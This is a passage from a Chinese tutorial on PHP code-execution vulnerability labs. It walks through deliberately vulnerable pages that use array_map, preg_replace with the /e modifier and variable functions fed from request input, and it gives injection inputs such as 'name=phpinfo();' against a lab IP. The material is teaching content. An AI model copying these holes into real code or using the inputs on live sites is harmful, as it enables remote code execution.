<?php
        if(isset($_GET['func'])||isset($_GET['argv'])){

                $func=$_GET['func'];
                $argv=$_GET['argv'];
                $array[0]=$argv;
                array_map($func,$array);
        }else{
                exit();
        }
```

> 首先，通过 isset($_GET['func']) || isset($_GET['argv']) 检查是否存在 func 或 argv 参数。
>
>如果这两个参数中至少有一个存在，将获取它们的值分别赋给 $func 和 $argv 变量。
>
>接着，将 $argv 的值存入数组 $array 的第一个元素。
>
>最后，使用 array_map() 函数，以 $func 为回调函数，对 $array 数组的每个元素调用一次回调函数。

![](https://pic.imgdb.cn/item/66a89681d9c307b7e9eeb6e5.png)


## 07 preg_replace

执行一个正则表达式的搜索和替换

>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
>
>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。
>
>参数说明：
> - $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
> - $replacement: 用于替换的字符串或字符串数组。
> - $subject: 要搜索替换的目标字符串或字符串数组。
> - $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
> - $count: 可选，为替换执行的次数。
>
>返回值
>
>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。
>
>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。


```
<?php  require_once('../header.php');?>
<html>
        <head>
                <title>代码执行漏洞</title>
        </head>
        <h2>代码执行漏洞preg_replace无漏洞函数示例</h2>
                <div class="alert alert-success">
                        <p>/07.php?name=tom</p>
                </div>
        <body>
<?php
        if(isset($_GET["name"])){
           $subject= 'hello hack';
           $pattern = '/hack/';
           $replacement = $_GET["name"];
           echo preg_replace($pattern, $replacement, $subject);
        }else{
                exit();
        }

?>
```

![](https://pic.imgdb.cn/item/66a8978dd9c307b7e9efc381.png)

其实他给的是无漏洞的，他已经严格的包裹了，这样的话你访问
```
http://192.168.159.137/execcode/07.php?name=phpinfo();
```

只能得到
![](https://pic.imgdb.cn/item/66a8988dd9c307b7e9f0b385.png)

## 08 preg_replace
但是你只要稍做手脚
```
<?php  require_once('../header.php');?>
<html>
        <head>
                <title>代码执行漏洞</title>
        </head>
        <h2>代码执行漏洞preg_replace无漏洞函数示例</h2>
                <div class="alert alert-success">
                        <p>/07.php?name=tom</p>
                </div>
        <body>
<?php
        if(isset($_GET["name"])){
           $subject= 'hello hack';
           $pattern = '/hack/e';
           $replacement = $_GET["name"];
           echo preg_replace($pattern, $replacement, $subject);
        }else{
                exit();
        }

?>
```

在hack后面加一个e就可以

![](https://pic.imgdb.cn/item/66a898a3d9c307b7e9f0c3fd.png)

## 09 可变函数
```
<?php  require_once('../header.php');?>
<html>
        <head>
                <title>代码执行漏洞</title>
        </head>
        <h2>可变函数漏洞示例01</h2>
                <div class="alert alert-success">
                        <p>/09.php?func=func1</p>
                </div>
        <body>
<?php
        if(isset($_REQUEST['func'])){
                function func1() {
                        echo "func1函数";
                }
                function func2($arg = '') {
                        echo "func2函数";
                }
                $func = $_REQUEST['func'];
                        echo $func();
        }else{
                exit();
        }

?>
```
func等于多少就返回啥
```func=phpinfo```
![](https://pic.imgdb.cn/item/66a89968d9c307b7e9f171f5.png)

## 10 可变函数

![](https://pic.imgdb.cn/item/66a89968d9c307b7e9f1720e.png)

## 回调函数
顺便补充一下回调函数
```例子
// 回调函数示例
function processNumbers($numbers, $callback) {
    $result = array_map($callback, $numbers);
    return $result;
}

// 回调函数1：将每个数字平方
function square($num) {
    return $num * $num;
}

// 回调函数2：将每个数字加倍
function double($num) {
    return $num * 2;
}

// 数字数组
$numbers = [1, 2, 3, 4, 5];

// 使用回调函数1：将每个数字平方
$squaredNumbers = processNumbers($numbers, 'square');
print_r($squaredNumbers);

// 使用回调函数2：将每个数字加倍
$doubledNumbers = processNumbers($numbers, 'double');
print_r($doubledNumbers);
```

```
processNumbers 函数：
processNumbers 函数接受两个参数：一个数字数组 $numbers 和一个回调函数 $callback。
在函数内部，它使用 array_map() 函数来将回调函数应用于数组中的每个元素。
最后，它返回应用回调函数后得到的结果数组。
回调函数：
square 函数和 double 函数是作为回调函数传递给 processNumbers 函数的。
square 函数实现了将输入数字平方的操作。
double 函数实现了将输入数字加倍的操作。
应用回调函数：
通过将不同的回调函数（square 或 double）作为参数传递给 processNumbers 函数，我们能够根据需要选择不同的操作。
当我们使用 processNumbers($numbers, 'square') 时，会将每个数字平方，并返回平方后的结果数组。
当我们使用 processNumbers($numbers, 'double') 时，会将每个数字加倍，并返回加倍后的结果数组。
```